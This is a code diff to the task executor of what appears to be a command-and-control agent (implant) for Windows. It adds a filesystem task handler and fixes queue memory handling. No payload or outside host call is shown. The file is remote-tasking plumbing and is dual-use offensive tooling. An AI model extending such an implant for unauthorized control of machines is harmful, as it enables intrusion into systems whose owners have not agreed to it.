@@ -2,6 +2,7 @@
 #include "utils/buffer.h"
 #include "executor/exit_el_patron.h"
 #include "executor/messagebox.h"
+#include "executor/fs.h"
 
 /* Constructor */
 Executor::Executor(WinApiCustom *pWinApiCustom, Queue *pTaskInputQueue, Queue *pTaskOutputQueue, Event *pAgentShouldStop, PCHAR agentId, DWORD executorIntervalMs)
@@ -153,6 +154,13 @@ void Executor::StartExecutor()
                     this->SetOutputInOutputQueue((PCHAR)taskId, strAgentCapResponseSuccess, FALSE);
                 }
 
+                //// FILESYSTEM
+                else if (IsTaskForFilesystem(task))
+                {
+                    HandleTaskFilesystem(this->pWinApiCustom, task);
+                    this->SetOutputInOutputQueue((PCHAR)taskId, strAgentCapResponseSuccess, FALSE);
+                }
+
                 //// FALLBACK
                 else
                 {
@@ -235,7 +243,7 @@ void Executor::SetOutputInOutputQueue(IN PCHAR taskId, IN PCHAR taskOutput, BOOL
     // Append to Task output
     if (!this->pTaskOutputQueue->AcquireThreadMutex())
         goto CLEANUP;
-    this->pTaskOutputQueue->Enqueue(taskOutputStatement);
+    this->pTaskOutputQueue->Enqueue(taskOutputStatement, taskOutputStatementLen);
     this->pTaskOutputQueue->ReleaseThreadMutex();
 
 CLEANUP:
@@ -244,6 +252,9 @@ CLEANUP:
 
     if (shouldFreeTaskOutputBuffer && taskOutput != NULL)
         this->pWinApiCustom->HeapFreeCustom(taskOutput);
+
+    if (taskOutputStatement != NULL)
+        this->pWinApiCustom->HeapFreeCustom(taskOutputStatement);
 }
 
 /*
@@ -260,12 +271,18 @@ void Executor::GetTasksForSelf()
         {
             // Pull out all tasks meant for this agent, and place them in Executor's own input queue; leave the rest in
             PCHAR taskData = NULL;
+            LPVOID pTask = NULL;
             for (int i = 0; i < numOfInputTasks; i++)
             {
                 taskData = (PCHAR)(this->pTaskInputQueue->GetDataAtIndex(i, FALSE)); // "TASK-123ABC-14-base64(input)"
                 if (CompareBuffer(this->pTaskAgentSpec, taskData, this->taskAgentSpecSize))
                 {
-                    this->TaskInputSelfQueue.Enqueue(this->pTaskInputQueue->DequeueAt(i));
+                    pTask = this->pTaskInputQueue->DequeueAt(i);
+                    this->TaskInputSelfQueue.Enqueue(
+                        pTask,
+                        StrLen((PCHAR)pTask) + 1
+                    );
+                    this->pWinApiCustom->HeapFreeCustom(pTask);
                 }
             }
         }
